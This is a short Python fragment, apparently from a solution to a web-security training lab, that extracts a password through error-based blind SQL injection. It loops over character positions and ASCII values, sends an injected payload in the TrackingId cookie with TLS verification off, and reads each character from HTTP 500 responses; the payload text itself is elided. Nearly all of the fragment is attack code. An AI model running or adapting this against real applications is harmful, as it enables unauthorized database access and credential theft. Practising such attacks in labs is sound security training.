...
def sqli_password(url):
    ...
    for i in range(1,21):
        for j in range(32,126):
            ...
            cookies={'TrackingId':'ipqoJlzqL0sLRFYI'+ sqli_payload_encoded,'session':'banqOL3Ha4xnzINP2U3uPVJQjn3T93OW'}
            r=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
            if r.status_code==500:
                password_extracted += chr(j) #convert ascii back to character
